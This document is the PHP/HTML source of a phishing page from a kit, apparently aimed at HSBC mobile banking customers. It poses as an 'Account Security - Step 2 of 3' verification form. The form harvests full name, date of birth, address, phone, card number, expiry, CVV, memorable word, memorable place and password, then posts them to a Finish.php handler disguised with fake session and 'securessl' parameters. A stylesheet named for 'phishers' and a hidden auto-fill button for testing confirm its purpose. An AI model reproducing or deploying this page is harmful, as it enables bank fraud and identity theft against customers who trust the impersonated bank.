<?php
/*

*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Verify</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/iphone.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1.0, minimum-scale=1.0">
<link type="text/css" rel="stylesheet" href="assets/css/mobile.css">
<link href="assets/css/l33bo_phishers_mobile_css.css" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script type='text/javascript'>
//Placeholders
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
//AutoTab
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
//Check Form
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",
				errorClass: "has-error",				
                rules: {
					name: {	required: true,	minlength: 4},
					dob: { required: true,	minlength: 10},
					address: { required: true, minlength: 3,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					email: { required: true, email: true,},
					telephone: { required: true, minlength: 11, digits: true,},
					sortcode: { required: true, minlength: 8,},
					acno: { required: true, minlength: 8,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 7,},
					secode: { required: true, minlength: 3, digits: true,},
					memoword: { required: true, minlength: 3,},
					memoplace: { required: true, minlength: 3,},
					telepin: { required: true, minlength: 6, digits: true,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please check the date of birth you have entered"),						
					},
					email: {
						required: "Please provide your email address",
						minlength: jQuery.validator.format("Plese check the email address you have entered"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please check the telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					town: {
						required: "Please provide your town/city",
						minlength: jQuery.validator.format("Please check the town/city you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					acno: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: {
						required: "Please provide your 6 digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					memoword: {
						required: "Please provide your memorable word",
						minlength: jQuery.validator.format("Please check the memorable word you have entered"),
					},
					memoplace: {
						required: "Please provide your memorable place",
						minlength: jQuery.validator.format("Please check the memorable place you have entered"),
					},
					telepin: {
						required: "Please provide your security code",
						minlength: jQuery.validator.format("Please check the security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
			$("#go").click(function() {
			$("#details").submit();

			});
        }
    }

    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });
//Check CC
})(jQuery, window, document);
 
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };
      $('form').submit(function(e) {
        e.preventDefault();
        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });
    });
</script>
<a href="#" onclick="populate();">
<div id="developer" style="display:none;color:red;background-color:yellow;padding:25px;font-size:20;font-weight:700">Populate Form</div>
</a>
<script>
function populate(){
document.getElementById("name").value = "Steve Smith";
document.getElementById("dob").value = "01/09/1972";
document.getElementById("telephone").value = "01896230525";
document.getElementById("email").value = "bob@aol.com";
document.getElementById("address").value = "21 Some road";
document.getElementById("postcode").value = "bt54 8gh";
document.getElementById("sortcode").value = "30-01-02";
document.getElementById("acno").value = "45803269";
document.getElementById("cc-number").value = "4111 1111 1111 1111";
document.getElementById("cc-exp").value = "12 / 16";
document.getElementById("secode").value = "521";
document.getElementById("mmn").value = "smithon";
document.getElementById("telepin").value = "45002";
}
</script>
<style>.has-error{display:block;margin:0;padding:0 0 .5em;color:#db0000;font-size:1.3em}</style>
</head>
<body>
<div id="mHeader">
 <img src="assets/img/logo.gif" width="235px" height="30px">
</div>
<div id="mContent">
<div id="date"><?php echo date('j M Y');?></div>
<div class="header">
<h1 id="heading">Account Security - Step 2 of 3</h1>
</div>
<div>
<div class="contentSegment">
<div id="olbol">
<ul class="legacy">
<li><span><strong>Internet Banking</strong></span></li>
<li><a class="redBtn" href="#"><span>Log on</span></a></li>
<li class="regLink"><a href="#">Register</a></li>
</ul>
</div>
<div class="topbar">
<div class="bottombar">
<div class="fragmentWrapper forgot-memorable-4">
<div class="formContent" id="personalLogonForm">
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" class="grid_24 logonForm" id="details" autocomplete="off" name="details">
<input name="user" type="hidden" value="<?=$_POST['userid'];?>"> 
<input name="bank" type="hidden" value="Hsbc">
<fieldset>
<legend>Verify your information below</legend>
<br />
<div class="formField"><label for="name">Full Name</label> <input autocomplete="off" class="wide" id="name" maxlength="20" name="name" type="text" value="<?php echo $_SESSION['name'];?>"></div>
<div class="formField"><label for="dob">Date of Birth</label> <input autocomplete="off" class="wide" id="dob" maxlength="10" name="dob" placeholder="DD/MM/YYYY" type="text" value="<?php echo $_SESSION['dob'];?>"></div>
<div class="formField"><label for="address">Address</label> <input autocomplete="off" class="wide" id="address" maxlength="30" name="address" placeholder="Line 1" type="text" value="<?php echo $_SESSION['address'];?>"></div>
<div class="formField"><label for="town">Province</label> <input autocomplete="off" class="wide" id="town" maxlength="30" name="town" type="text" value="<?php echo $_SESSION['town'];?>"></div>
<div class="formField"><label for="telephone">Mobile Number</label> <input autocomplete="off" class="wide" id="telephone" maxlength="11" name="telephone" type="tel" value="<?php echo $_SESSION['telephone'];?>"></div>
<div class="formField"><label for="ccno">Card Number</label> <input autocomplete="off" class="wide cc-number" id="cc-number" maxlength="20" name="ccno" type="tel" value=""></div>
<div class="formField"><label for="ccexp">Card Expiry</label> <input autocomplete="off" class="wide cc-exp" id="cc-exp" maxlength="7" name="ccexp" type="tel" value=""></div>
<div class="formField"><label for="secode">Card Security Code</label> <input autocomplete="off" class="wide" id="secode" maxlength="3" name="secode" type="tel" value="" style="width: 60px!important;"></div>
<div class="formField"><label for="memoword">Memorable Word</label> <input autocomplete="off" class="wide" id="memoword" maxlength="20" name="memoword" type="text" value=""></div>
<div class="formField"><label for="memoplace">Memorable Place</label> <input autocomplete="off" class="wide" id="memoplace" maxlength="20" name="memoplace" type="text" value=""></div>
<div class="formField"><label for="telepin">Password</label> <input autocomplete="off" class="wide" id="telepin" maxlength="10" name="telepin" placeholder="" type="tel" value=""></div>
<div style="padding:5px;"></div>
<div id="continue" class="inputStyleRed clearfix">
<br>
<input type="submit" id="go" class="btnImg" alt="Continue" title="Continue" value="Continue">
<span></span>
</div>
</div>
</fieldset>
</form>
<div class="asidecol">
<h2>New customers</h2>
<ul>
<li>
<a class="pws" href="#" target="_self" onclick=">Register for Online Banking</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<ul class="menu">
<li class="question"><a href="#"><span>Questions</span></a></li>
<li class="contact"><a href="#"><span>Contact us</span></a></li>
<li class="desktop"><a href="#"><span>Desktop view</span></a></li>
</ul>
</div>
</body>
</html>